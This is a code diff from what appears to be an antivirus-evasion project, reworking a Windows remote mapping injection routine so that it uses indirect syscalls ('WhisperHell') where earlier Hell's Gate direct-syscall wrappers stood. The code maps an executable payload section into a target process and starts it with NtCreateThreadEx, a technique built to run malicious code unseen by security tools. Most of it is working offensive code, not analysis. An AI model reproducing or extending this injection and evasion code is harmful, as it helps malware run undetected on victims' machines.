@@ -52,8 +52,8 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 	// First NtQuerySystemInformation call
 	// This will fail with STATUS_INFO_LENGTH_MISMATCH
 	// But it will provide information about how much memory to allocate (uReturnLen1)
-	HellsGate(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
-	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);
+	WhisperHell(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
+	NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);
 
 	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
 	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
@@ -64,8 +64,8 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 
 	// Second NtQuerySystemInformation call
 	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
-	HellsGate(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
-	if ((status = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x0)) {
+	WhisperHell(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
+	if ((status = NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x0)) {
 		PRINTA("[!] HellDescent Failed With Error :  0x%0.8X\n", status);
 		return FALSE;
 	}
@@ -114,22 +114,8 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	SIZE_T          sViewSize = 0;
 	DWORD           dwLocalFlag = bIsLocalInjection ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
 
-	/// Allocating local map view
-	//HellsGate(g_SyscallsTable.NtCreateSection.wSystemCall);
-	//if (status = HellDescent(
-	//	&hSection,
-	//	SECTION_ALL_ACCESS,
-	//	NULL,
-	//	&liMaxSize,
-	//	PAGE_EXECUTE_READWRITE,
-	//	SEC_COMMIT,
-	//	NULL
-	//) != 0) {
-	//	PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
-	//	return FALSE;
-	//}
-	/// ENHANCEMENT: Using Hell's Gate with indirect syscall
-	OpenDoor(g_SyscallsTable.NtCreateSection.wSystemCall);
+	// Allocating local map view
+	WhisperHell(g_SyscallsTable.NtCreateSection.wSystemCall);
 	if ((status = NtCreateSection(
 		&hSection,
 		SECTION_ALL_ACCESS,
@@ -142,22 +128,8 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
-	//HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
-	//if (status = HellDescent(
-	//	hSection,
-	//	GetCurrentProcessHandle(),
-	//	&pAllocatedAddress,
-	//	NULL, NULL, NULL,
-	//	&sViewSize,
-	//	ViewShare,
-	//	NULL,
-	//	dwLocalFlag
-	//) != 0) {
-	//	PRINTA("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", status);
-	//	return FALSE;
-	//}
-	OpenDoor(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
-	if ((status = GoToDoor(
+	WhisperHell(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
+	if ((status = NtMapViewOfSection(
 		hSection,
 		GetCurrentProcessHandle(),
 		&pAllocatedAddress,
@@ -182,23 +154,8 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 
 	// Allocating remote map view 
 	if (!bIsLocalInjection) {
-		//HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
-		//if ((status = HellDescent(
-		//	hSection,
-		//	hProcess,
-		//	&pAllocatedRemoteAddress,
-		//	NULL, NULL, NULL,
-		//	&sViewSize,
-		//	ViewShare,
-		//	NULL,
-		//	PAGE_EXECUTE_READWRITE
-		//)) != 0x0) {
-		//	PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
-		//	return FALSE;
-		//}
-
-		OpenDoor(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
-		if ((status = GoToDoor(
+		WhisperHell(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
+		if ((status = NtMapViewOfSection(
 			hSection,
 			hProcess,
 			&pAllocatedRemoteAddress,
@@ -230,23 +187,8 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	GETCHAR();
 
 	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
-	//HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
-	//if ((HellDescent(
-	//	&hThread,
-	//	THREAD_ALL_ACCESS,
-	//	NULL,
-	//	hProcess,
-	//	pExecAddress,
-	//	NULL,
-	//	NULL,
-	//	NULL, NULL, NULL,
-	//	NULL
-	//)) != 0x0) {
-	//	PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
-	//	return FALSE;
-	//}
-	OpenDoor(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
-	if ((GoToDoor(
+	WhisperHell(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
+	if ((status = NtCreateThreadEx(
 		&hThread,
 		THREAD_ALL_ACCESS,
 		NULL,
@@ -268,8 +210,8 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	// Waiting for the thread to finish
 	/// !ERROR: somehow, I got this exception: 
 	/// "Unhandled exception at 0x00007FFD5DD16E99 (bcryptprimitives.dll) in BypassingAVs.exe: 0xC0000005: Access violation reading location 0xFFFFFFFFFFFFFFFF."
-	HellsGate(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
-	if ((status = HellDescent(
+	WhisperHell(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
+	if ((status = NtWaitForSingleObject(
 		hThread,
 		FALSE,
 		NULL
@@ -279,8 +221,8 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	}
 
 	// Unmapping the local view
-	HellsGate(g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
-	if ((status = HellDescent(
+	WhisperHell(g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
+	if ((status = NtUnmapViewOfSection(
 		hProcess,
 		pAllocatedAddress
 	)) != 0x0) {
@@ -289,8 +231,8 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	}
 
 	// Closing the section handle
-	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
-	if ((status = HellDescent(
+	WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
+	if ((status = NtClose(
 		hSection
 	)) != 0x0) {
 		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
